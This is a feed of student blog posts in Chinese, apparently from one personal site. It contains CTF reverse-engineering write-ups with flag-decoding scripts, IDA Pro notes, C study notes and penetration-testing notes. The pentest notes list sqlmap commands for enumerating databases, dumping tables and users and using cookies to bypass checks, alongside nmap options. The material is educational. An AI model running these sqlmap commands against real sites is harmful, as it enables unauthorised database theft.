class="line">$$$$$$$$$&amp;$$&amp;$$</span><br><span class="line">$$$$$$$$$&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y</span><br></pre></td></tr></table></figure><p>&amp;是路,$是墙,用最短路线走到y<br><img src="reverse_maze3.png" alt="alt text"><br>然后转md5就是flag了</p><h2 id="Week1-Ez-Xor"><a href="#Week1-Ez-Xor" class="headerlink" title="[Week1] Ez Xor"></a>[Week1] Ez Xor</h2><p>用ida看到如下内容<br><img src="re_ezxor1.png" alt="alt text"><br><img src="re_ezxor2.png" alt="alt text"><br><img src="re_ezxor3.png" alt="alt text"></p><p>这段程序通过keystream函数生成了长度为28的key<br>然后通过encrypt函数对用户的输入进行xor运算<br>然后通过checkflag函数将加密后的用户输入和str比较</p><p>由于</p><ol><li>key是固定生成的</li><li>xor的逆运算是再xor一遍<br>所以能够用c将keystream 和 encrypt实现<br>将str作为输入<br>就能得到flag了</li></ol><p>str如下<br><img src="re_ezxor4.png" alt="alt text"></p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void decrypt(int \*v14,int \*str,int v17)&#123;</span><br><span class="line">for (int i=0;i&lt;v17;i++)&#123;</span><br><span class="line">printf(&quot;%d&quot;, str[i]);</span><br><span class="line">str[i]=str[i]^v14[v17-i-1];</span><br><span class="line">printf(&quot;%d %d\n&quot;,str[i], v14[v17-i-1]);</span><br><span class="line">// printf(&quot;%d&quot;,str[i]);</span><br><span class="line">&#125;</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line">void KeyStream(int \*v4,int \*v14,int a3)&#123;</span><br><span class="line">for (int i=0;i&lt;a3;i++)&#123;</span><br><span class="line">v14[i]=i^v4[i%3];</span><br><span class="line">// printf(&quot;%c&quot;,v14[i]);</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">int v4[3]=&#123;&#x27;X&#x27;,&#x27;o&#x27;,&#x27;r&#x27;&#125;;</span><br><span class="line">int v14[28]=&#123;88,110,112,91,107,119,94,104,122,81,101,121,84,98,124,87,127,99,74,124,102,77,121,101,64,118,104,67&#125;;</span><br><span class="line">// int v14[28];</span><br><span class="line">int v5[28];</span><br><span class="line">int str[28]=&#123;1,9,5,&#x27;%&#x27;,&#x27;&amp;&#x27;,&#x27;-&#x27;,0x0B,0x1D,&#x27;$&#x27;,&#x27;z&#x27;,&#x27;1&#x27;,&#x27; &#x27;,0x1E,&#x27;I&#x27;,&#x27;=&#x27;,&#x27;g&#x27;,&#x27;M&#x27;,&#x27;P&#x27;,8,&#x27;%&#x27;,&#x27;.&#x27;,&#x27;n&#x27;,5,&#x27;4&#x27;,&#x27;\&quot;&#x27;,&#x27;@&#x27;,&#x27;;&#x27;,&#x27;%&#x27;&#125;;</span><br><span class="line">KeyStream(&amp;v4,v14,28);</span><br><span class="line">decrypt(v14,str,28);</span><br><span class="line">// for(int i=0;i&lt;28;i++)&#123;</span><br><span class="line">// printf(&quot;%d,&quot;, v14[i]);</span><br><span class="line">// &#125;</span><br><span class="line">for(int i=0;i&lt;28;i++)&#123;</span><br><span class="line">printf(&quot;%c&quot;, str[i]);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Week1-BasePlus"><a href="#Week1-BasePlus" class="headerlink" title="[Week1] BasePlus"></a>[Week1] BasePlus</h2><p>伪代码如下<br><img src="re_base1.png" alt="alt text"><br><img src="re_base2.png" alt="alt text"><br><img src="re_base3.png" alt="alt text"></p><p>其加密逻辑大致是</p><ol><li>将用户的输入以3个字符为单位分组,不足的用0作为填充</li><li>加载每个分组,通过<em>二进制运算</em>得到下标,通过secret字典产生4个密文</li><li>最终的密文长度,就是分组数*4</li></ol><p>程序提供了加密后的flag<br>我们可以通过flag的每4个字符,和secret字典比对得到每4个下标</p><p>这4个下标来自于明文的每3个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 一个字符有8bit</span><br><span class="line">(unsigned \_\_int8)v15 &gt;&gt; 2 // 第一个字符的前6个bit</span><br><span class="line">(HIBYTE(v15) &gt;&gt; 4) | (16 \* v15) &amp; 0x30 // 第二个字符的前4bit和第一个字符的后2bit</span><br><span class="line">(v16 &gt;&gt; 6) | (4 \* HIBYTE(v15)) &amp; 0x3C // 第三个字符的前2个bit和第二哥字符的后4bit</span><br><span class="line">v16 &amp; 0x3F // 第三个字符的后6bit</span><br></pre></td></tr></table></figure><p>总之,我们只要把所有的bit拼回去,就能得到flag</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">flag = &quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span><br><span class="line">secret=&quot;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&quot;</span><br><span class="line">flag = list(flag)</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">flag[i] = ord(flag[i]) ^ 0xE</span><br><span class="line">for i in range(0, len(flag),4):</span><br><span class="line">a1=secret.index(chr(flag[i])) # v15 前6位 为00111111</span><br><span class="line">a2=secret.index(chr(flag[i+1])) # v16的前4位和v15后2位为00001111和00110000</span><br><span class="line">a3=secret.index(chr(flag[i+2])) # v16的后4位和v17的前2位00111100 00000011</span><br><span class="line">a4=secret.index(chr(flag[i+3])) # v17的后6位00111111</span><br><span class="line">v15\_1 = (a2 &amp; 0b00110000)&gt;&gt;4</span><br><span class="line">v15\_2 = a1&lt;&lt; 2</span><br><span class="line">v15 = v15\_1 | v15\_2</span><br><span class="line">v16\_1 = (a2 &amp; 0b00001111) &lt;&lt; 4</span><br><span class="line">v16\_2 = (a3&amp;0b00111100) &gt;&gt; 2</span><br><span class="line">v16=v16\_1|v16\_2</span><br><span class="line">v17\_1=(a3&amp;0b00000011)&lt;&lt;6</span><br><span class="line">v17\_2=(a4 &amp; 0b00111111)</span><br><span class="line">v17=v17\_1|v17\_2</span><br><span class="line">print(chr(v15),end=&#x27;&#x27;)</span><br><span class="line">print(chr(v16),end= &#x27;&#x27;)</span><br><span class="line">print(chr(v17),end= &#x27;&#x27;)</span><br></pre></td></tr></table></figure><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h2><hr><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆逆逆逆逆向-CTF之reverse</title>
      <link href="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/"/>
      <url>/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/</url>
      
        <content type="html"><![CDATA[<h1 id="既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类"><a href="#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类" class="headerlink" title="既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类"></a>既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类</h1><p>关键基本都在ida pro的使用<br>以及反编程后的信息搜集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~目前来说有用的记录~</span><br><span class="line">shift+f12 查看字符串</span><br><span class="line">ctrl+X 查询该字符串对应内存的相关调用</span><br><span class="line">f5 查看伪c代码</span><br><span class="line">代码中的变量直接选中后双击就可查看具体内容</span><br><span class="line">alt+T</span><br><span class="line">ida pro的环境目录内最好是纯英文 不然会出各种各样的bug</span><br></pre></td></tr></table></figure><h2 id="测试题-BUUCTF-easyre1"><a href="#测试题-BUUCTF-easyre1" class="headerlink" title="测试题 BUUCTF-easyre1"></a>测试题 BUUCTF-easyre1</h2><p>将题目提供的exe以ida pro打开<br><img src="1.jpg" alt="1"><br>ida pro会自动判断我们提供软件的类型并提供选择 这里直接点击ok<br><img src="2.jpg" alt="2"><br>软件内有很多不同的视窗 我们来主要分析他生成的视窗化代码<br><img src="3.jpg" alt="3"><br>很明显这段就是flag 输入后便能完成题目<br>目前先更到这里 后面主要讲解ida pro 的各项功能和视窗的不同 然后再来两个例题</p><h2 id="至于ida相关的介绍"><a href="#至于ida相关的介绍" class="headerlink" title="至于ida相关的介绍"></a>至于ida相关的介绍</h2><blockquote><p>主页面<br><img src="4.jpg" alt="4"></p></blockquote><blockquote><p>函数窗口<br>可以使用 <code>ctrl+f</code> 搜索指定名称的函数<br><img src="5.jpg" alt="5"></p></blockquote><blockquote><p>数据窗口<br>分为 <strong>视图</strong> 和 <strong>文字</strong> 两种显示方式 可以按空格来切换 文字视窗展示了一些汇编代码和地址<br><img src="6.jpg" alt="6"><br><img src="7.jpg" alt="7"></p></blockquote><blockquote><p>伪代码模式（F5）<br>在汇编窗口文本模式中对着函数点F5即可弹出伪代码窗口。其是将汇编语言变成伪代码，方便阅读。<br><img src="8.jpg" alt="8"></p></blockquote><blockquote><p>十六进制窗口<br>默认情况下，十六进制窗口显示程序内容和列表的标准十六进制代码，每行显示16个字节，以及其对应的ASCII字符。和在反汇编窗口中一样，用户也可以同时打开几个十六进制窗口<br><img src="9.jpg" alt="9"></p></blockquote><blockquote><p>消息窗口<br>显示IDA输出的信息，用户可以通过输出信息找到文件分析有关的状态信息和操作导致的错误信息，这个窗口类似于Pycharm等软件的Console控制台。<br><img src="10.jpg" alt="10"></p></blockquote><blockquote><p>导航栏：<br>彩色的水平带是 IDA 的概况导航栏，也叫做导航带。导航带是被加载文件地址空间的线性视图。默认情况下，它会呈现二进制文件的整个地址范围。你可以右击导航带内任何位置。在导航带上，会有一个细小的当前位置指示符（默认为黄色）指向与当前反汇编窗口中显示的地址范围对应的导航带地址。将光标悬停在导航带的任何位置，IDA 会显示一个提示，指出其在二进制文件中的对应位置。<br>简单来说，点到哪里跳到哪里，而不同的颜色代表了不同的数据段，比如说data段，text段等<br><img src="11.jpg" alt="11"></p></blockquote><blockquote><p>参考:<a href="https://blog.csdn.net/qq_52642385/article/details/135620222">https://blog.csdn.net/qq_52642385/article/details/135620222</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求解</title>
      <link href="/2024/07/14/%E6%B1%82%E8%A7%A3/"/>
      <url>/2024/07/14/%E6%B1%82%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="这里记录一下暑假两个月自学的笔记"><a href="#这里记录一下暑假两个月自学的笔记" class="headerlink" title="这里记录一下暑假两个月自学的笔记"></a>这里记录一下暑假两个月自学的笔记</h1><p>汇编语言-给电脑看的语言 虽然也是要被转化为0与1的 但层次更为粗糙 可读性更低<br>vscode的debugger<br>make clang debug50等用法</p><h4 id="声明数组"><a href="#声明数组" class="headerlink" title="声明数组"></a>声明数组</h4><p>int 数组名[数组大小]<br>数组名[从零开始的数组序号] &#x3D; 变量名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例</span><br><span class="line">int scores[3];</span><br><span class="line">scores[0] = 72;</span><br><span class="line">scores[1] = 77;</span><br><span class="line">scores[2] = 98;</span><br></pre></td></tr></table></figure><p>可以通过get_int函数达到获取int数值的作用</p><p>const是常量 定义之后无法再更改<br>例<br><code>const int n =3</code></p><p>数据在处理的时候会占用内存<br>而每段数据为了表明字符串已结束会多加一个字节<br>例： 3个字符 将占用3+1个字节</p><p>string 字符串 由char（字符） 组成<img src="image.png" alt="image"></p><p>大写和小写字母在acsii码中正好差32<br>小写转大写减去32即可<br><img src="12.png" alt="12"></p><p>比较string用的是strcmp（string1，string2）<br><img src="22.png" alt="22"><br>linear search 线性<br>binary search 二分<br>还有排序相关的<br>选择排序算法<br>一次一次选最小的元素 放到最左边</p><p>冒泡排序算法<br>抓出来一个和别的依次比较<br>假如大就往右移（互换位置）<br>然后依次解决</p><p>选择排序的次数是n（n-1）&#x2F;2 (已编辑)<br>数量大概是n的平方</p><p>冒泡排序的次数为（n-1）（n-1）<br>这俩的上限其实都差不多<br>这俩的上界都是n方<br>下界是<br>冒泡排序在数据已经接近或已经有序的情况下<br>更有优势吧<br>感觉这俩更像是两个顺序不同的排序<br>选择排序主要是从左到右筛选<br>冒泡排序主要是从右到左</p><p>然后是在函数里套函数的情况<br>void draw(int n)<br>{}<br><img src="31.png" alt="31"><br>归并排序<br>把数据拆成两半<br>并分别排好顺序<br>例<br>0136 2457<br>然后先看两边的第一个<br>0<br>排前面<br>现在揭露0右边的1<br>再把1和2比较<br>以此类推<br>归并会将这些数据先拆成两个两个<br>二个排序→四个排序→八个排序<br>以此类推<br>有更好的效率</p><p>%p 输出地址<br>变量名前面要加上&amp;<br>上面这个是在printf中的用法<br>定义时使用<code>*p</code> 表明p是一个指针</p><p>静态数组：静态定义的数组在程序加载的时候就已经分配了内存空间，直到函数结束或者程序结束后才会被释放；%20动态数组：由malloc()或new()等函数定义的数组，在程序运行时才申请内存空间，使用完后可以借助free()或delete()手动释放。</p><p>以scanf来获取数据</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>夺旗时间</title>
      <link href="/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/"/>
      <url>/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>三个月的假期准确来说还没到 在这之前 预热一下CTF的学习</p><h2 id="CTF题目类别"><a href="#CTF题目类别" class="headerlink" title="CTF题目类别"></a>CTF题目类别</h2><p>-Reverse<br>-题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力。<br>-所需知识：汇编语言、加密与解密、常见反编译工具</p><p>-Pwn<br>-Pwn 在黑客俚语中代表着攻破，获取权限，在 CTF 比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有整数溢出、栈溢出、堆溢出等。主要考查参赛选手对漏洞的利用能力。<br>-所需知识：C，OD+IDA，数据结构，操作系统</p><p>-Web<br>-Web 是 CTF 的主要题型，题目涉及到许多常见的 Web 漏洞，如 XSS、文件包含、代码执行、上传漏洞、SQL 注入等。也有一些简单的关于网络基础知识的考察，如返回包、TCP&#x2F;IP、数据包内容和构造。可以说题目环境比较接近真实环境。<br>-所需知识：PHP、Python、TCP&#x2F;IP、SQL</p><p>-Crypto<br>-题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见编码解码，主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合。<br>-所需知识：矩阵、数论、密码学</p><p>-Misc<br>-Misc 即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等，覆盖面比较广，主要考查参赛选手的各种基础综合知识。<br>-所需知识：常见隐写术工具、Wireshark 等流量审查工具、编码知识</p><p>-Mobile<br>-主要分为 Android 和 iOS 两个平台，以 Android 逆向为主，破解 APK 并提交正确答案。<br>-所需知识：Java，Android 开发，常见工具</p><h2 id="至于知识点"><a href="#至于知识点" class="headerlink" title="至于知识点"></a>至于知识点</h2><p>linux基础<br>HTML基础<br>HTTP协议基础<br>JAVASCRIPT基础<br>Web服务器基础<br>Owasp漏洞基础<br>PHP代码审计基础</p><p>C&#x2F;C++基础<br>汇编语言基础(我目前的努力方向)</p><h2 id="汇编语言基础相关（以x86为核心）"><a href="#汇编语言基础相关（以x86为核心）" class="headerlink" title="汇编语言基础相关（以x86为核心）"></a>汇编语言基础相关（以x86为核心）</h2>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学学学</title>
      <link href="/2024/06/01/%E5%AD%A6%E5%AD%A6%E5%AD%A6/"/>
      <url>/2024/06/01/%E5%AD%A6%E5%AD%A6%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>差不多类似于现状汇报？</p><ul><li>还活着</li><li>转段考通过了 考进大学了</li><li>目前在健身+寻找新的爱好 目标</li></ul><p>破费在阿里云里花了600多 开了个teamspeak服务器<br>嘛 至少能坚持三年 结果是令人满意的<br>至于开服的具体细节 还请自行搜索</p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 告示 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试相关</title>
      <link href="/2024/05/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/"/>
      <url>/2024/05/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>目前确定的说法之渗透测试的<strong>生命周期</strong></p><blockquote><p>渗透测试项目的生命周期可分为如下7个阶段：需求分析、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试、撰写报告。<br>以下是PETS渗透测试项目生命周期的主要阶段：  </p><ol><li>前期交互阶段：<br>• 与客户组织进行深入讨论，明确渗透测试的范围和目标。<br>• 确保客户组织了解并同意测试所涉及的内容，从而确保测试的顺利进行。  </li><li>情报搜集阶段：<br>• 使用各种方法和技术来收集目标系统的信息，包括操作系统、开放的端口、网络架构等。<br>• 通过社交媒体网络、Google Hacking技术、目标系统踩点等方式获取目标系统的详细信息。  </li><li>威胁建模阶段：<br>• 利用情报搜集阶段获取的信息，分析目标系统上可能存在的安全漏洞和弱点。<br>• 识别潜在的安全风险，并为后续的渗透攻击阶段制定策略。  </li><li>漏洞分析阶段：<br>• 综合前面阶段获取的信息，分析哪些攻击途径是可行的。<br>• 评估漏洞的严重程度和潜在影响，为攻击阶段提供决策依据。  </li><li>渗透攻击阶段：<br>• 根据前面的分析结果，对目标系统实施渗透攻击。<br>• 尝试利用已发现的漏洞，获取目标系统的权限或访问敏感数据。  </li><li>后渗透攻击阶段：<br>• 在成功渗透后，进一步探索目标系统，获取更多的信息和权限。<br>• 评估客户组织可能面临的最大业务风险，并提供相应的安全建议。  </li><li>报告阶段：<br>• 编写详细的渗透测试报告，记录测试过程和发现的问题。<br>• 从防御者的角度提出针对性的安全建议和改进措施，帮助客户组织加强安全防护。<br>请注意，每个阶段都至关重要，需要精心设计和执行。同时，与客户保持良好的沟通和合作也是确保测试成功的关键。在整个生命周期中，测试人员需要遵循安全准则和最佳实践，确保测试的合法性和道德性。</li></ol></blockquote><p>熟记即可<br><strong>简述题</strong> 列举常用渗透测试工具。</p><blockquote><p>信息收集类工具有nmap、fping、dnsmap等<br>漏洞分析类工具有sqlmap、nessus、awvs等<br>漏洞利用类工具有metasploit、burpsuite等<br>密码破解类工具有hydra、john、hashcat等<br>数据分析类工具有wireshark等。</p></blockquote><p>简述扫描技术的分类<br>扫描技术按照不同划分标准有不同的分类方式。如按照扫描技术分类可分为TCP扫描、UDP扫描，ICMP扫描、ARP扫描。其中TCP扫描又分为TCP CONNECT()扫描、TCP SYN扫描（这种方法较为常见）。ARP扫描效率较高，但不能跨网段，且工作在数据链路层，主要用于探测本地局域网中的主机存活情况。按照扫描所使用协议的工作层次，可分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。</p><p>然后是渗透测试要用到的工具相关</p><h1 id="一、nmap"><a href="#一、nmap" class="headerlink" title="一、nmap"></a>一、nmap</h1><p>nmap的主要功能包括目标主机存活性扫描(-sn)、端口扫描（-sS或-p80,443）、操作系统信息探测(-O)、漏洞信息探测(–script&#x3D;&#x3D;default)。</p><p>nmap如下选项具体用途（-sn，-p-，-sV，-O，-sT，-sS，-sU）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sn 主机存活性扫描，类似于-sP;</span><br><span class="line">-p- 全端口扫描，类似于-p1-65535</span><br><span class="line">-sV 服务及版本扫描</span><br><span class="line">-O 操作系统类型探测</span><br><span class="line">-sT 全连接扫描（与目标建立完整三次握手）</span><br><span class="line">-sS 半连接扫描</span><br><span class="line">-sU UDP方式扫描</span><br></pre></td></tr></table></figure><p><strong>简述nmap探测主机存活的技术有哪些？</strong></p><p><strong>Q:</strong> 按照扫描技术分类，Nmap的扫描可以分为TCP扫描、UDP扫描、ICMP扫描和ARP扫描等。</p><ol><li><strong>TCP</strong> <strong>扫描</strong>：TCP扫描是最常用的扫描类型之一，主要用于探测目标主机上开放的TCP端口和提供的TCP服务。TCP扫描又可以分为TCP connect()扫描和TCP SYN扫描等方法。<br>o <strong>TCP connect()</strong> <strong>扫描</strong>：这是最基本的TCP扫描方式，通过尝试与目标主机的每个TCP端口建立完整的三次握手连接来判断端口是否开放。<br>o <strong>TCP SYN</strong> <strong>扫描</strong>：SYN扫描是Nmap的默认扫描方式。它向目标主机的端口发送一个SYN数据包，并等待SYN&#x2F;ACK响应。如果收到响应，则认为该端口是开放的。SYN扫描的优点是速度快且不易被检测到，因为它不会完成整个三次握手。</li><li><strong>UDP</strong> <strong>扫描</strong>：UDP扫描用于探测目标主机上开放的UDP端口。由于UDP是无连接的协议，因此UDP扫描通常比TCP扫描更困难。</li><li><strong>ICMP</strong> <strong>扫描</strong>：ICMP扫描主要利用ICMP协议来探测目标主机的网络连通性和可达性。</li><li><strong>ARP</strong> <strong>扫描</strong>：ARP扫描是一种在本地局域网中非常有效的主机发现方法。它通过发送ARP请求来探测目标主机是否存活。ARP扫描的效率很高，但不能跨网段，且只能扫描主机存活情况，不能探测端口开放情况。<br>其次，按照扫描所使用的协议工作层次，Nmap的扫描可以分为二层扫描（ARP）、三层扫描（ICMP、IP）和四层扫描技术（TCP、UDP）。</li></ol><p>· <strong>二层扫描（ARP）</strong>：在数据链路层进行扫描，主要用于探测本地局域网中的主机存活情况。<br>· <strong>三层扫描（ICMP、IP）</strong>：在网络层进行扫描，主要用于探测目标主机的网络连通性和可达性。<br>· <strong>四层扫描（TCP、UDP）</strong>：在传输层进行扫描，主要用于探测目标主机上开放的TCP和UDP端口以及提供的服务。<br>总的来说，Nmap的扫描技术非常丰富和灵活，可以根据不同的需求和目的选择不同的扫描类型选项，以获取更全面和详细的扫描结果。</p><h1 id="二、sqlmap"><a href="#二、sqlmap" class="headerlink" title="二、sqlmap"></a>二、sqlmap</h1><h2 id="总之介绍一下各种参数吧"><a href="#总之介绍一下各种参数吧" class="headerlink" title="总之介绍一下各种参数吧"></a>总之介绍一下各种参数吧</h2><p>一般起始是python sqlmap.py</p><p>-u 决定目标url<br><code>sqlmap -u &#39;目标地址&#39;</code><br>–cookie 设置cookie 绕过安全检查<br><code>sqlmap -u &#39;目标地址&#39; --cookie &#39;cookie值&#39;</code><br>–dbs 列出所有数据库<br><code>sqlmap -u &#39;目标地址&#39; --dbs</code><br>-D 指定数据库 –tables 爆出所有表<br><code>sqlmap -u &#39;目标地址&#39; -D &#39;库名&#39; --tables</code><br>-T 指定表 –dump 爆出所有数据<br><code>sqlmap -u &#39;目标地址&#39; -D &#39;库名&#39; -T &#39;表名&#39; --dump</code><br>–current-user 显示当前用户<br><code>sqlmap -u &#39;目标地址&#39; --current-user</code><br>–is-dba 检测是否为数据库管理员<br><code>sqlmap -u &#39;目标地址&#39; --is-dba</code><br>–users 获取所有用户<br><code>sqlmap -u &#39;目标地址&#39; --users</code></p><h2 id="然后是手动注入"><a href="#然后是手动注入" class="headerlink" title="然后是手动注入"></a>然后是手动注入</h2><p>这块我不太懂先略过</p><h1 id="三、BURPSUITE"><a href="#三、BURPSUITE" class="headerlink" title="三、BURPSUITE"></a>三、BURPSUITE</h1><p>主要是针对web应用程序的攻击 一款集成化的渗透测试工具<br>主要功能是抓包 改包 自带一个暴力破解模块 有四种attack type(攻击类型)</p><ul><li>Sinper（狙击手）</li><li>Battering ram（攻城槌）</li><li>Pitchfork（干草叉）</li><li>Cluster bomb（集束炸弹）</li></ul><h1 id="四、Ettercap"><a href="#四、Ettercap" class="headerlink" title="四、Ettercap"></a>四、Ettercap</h1><p>主要用于伪造或篡改数据包以实现SRP DNS协议的中间人攻击<br>没了</p><h1 id="五、metasploit"><a href="#五、metasploit" class="headerlink" title="五、metasploit"></a>五、metasploit</h1><p>Metasploit框架的核心组成部分包括exploit（漏洞利用模块）、payload（负载模块）、auxiliary（辅助模块）和post（后渗透模块）<br>exploit模块负责利用目标系统的漏洞<br>payload模块则负责在成功利用漏洞后执行特定任务<br>auxiliary模块提供非攻击性质的功能 如扫描、枚举和信息收集<br>post模块则用于在取得目标系统权限后进行进一步的信息收集和权限维持</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>协议/漏洞/网络</title>
      <link href="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/"/>
      <url>/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p>从头到尾再来一遍的感觉吧</p><h1 id="一、协议相关"><a href="#一、协议相关" class="headerlink" title="一、协议相关"></a>一、协议相关</h1><blockquote><p>网络通信协议是根据网络上的节点进行通信的一组规则，每种设备都可以根据通信协议识别其他设备的信息。</p></blockquote><h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><p>要讲网络协议 我们得先从OSI七层模型说起 OSI将网络通信分为七个层次 每个层次负责特定的功能 并且每个层次都与特定的协议相关联<br>它们分别为物理层、数据链路层、网络层、传输层、会话层、表示层和应用层</p><ol><li><strong>物理层：把网络连接在一起的物理手段 负责传送0与1的电信号</strong></li><li><strong>数据链路层：决定0与1的解读 分组方式</strong> 相关协议:ARP协议</li><li><strong>网络层：引进一套新的地址——“网络地址” 使得我们能区分不同的计算机是否属于同一个子网络 建立主机到主机的通信</strong> 相关协议：IP、ICMP协议</li><li><strong>传输层：有了MAC地址和IP地址 我们还需要一个参数 表示这个数据包到底供哪个程序来使用 这个参数就叫’端口’ 实现端口到端口的通信</strong> 相关协议：TCP、UDP协议</li><li>**会话层：负责建立和断开通信连接，以及数据的分割等传输相关的管理 （例：何时建立连接？何时断开连接？该保持多久的连接？）**相关协议：SSL、TLS协议</li><li><strong>表示层：设备固有的数据格式与网络标准数据格式之间的转换 （接受不同的信息，例如文字流、图像、声音等）</strong></li><li><strong>应用层：针对特定应用的协议 网络服务与最终用户的一个接口</strong> 相关协议：HTTP、FTP、DNS、DHCP等协议<br><img src="1.png" alt="1"></li></ol><h2 id="HTTP协议-端口号80-HTTPS协议-端口号443"><a href="#HTTP协议-端口号80-HTTPS协议-端口号443" class="headerlink" title="HTTP协议 端口号80 HTTPS协议 端口号443"></a>HTTP协议 端口号80 HTTPS协议 端口号443</h2><p><strong>Web交互的基本流程</strong><br>请求：客户端根据服务器地址把数据发送给服务器的过程叫请求。<br>响应：服务器将请求的处理结果发送给浏览器的过程叫响应。</p><p><strong>什么是HTTP？</strong><br>概念：超文本传输协议。</p><h3 id="HTTP有什么特点？"><a href="#HTTP有什么特点？" 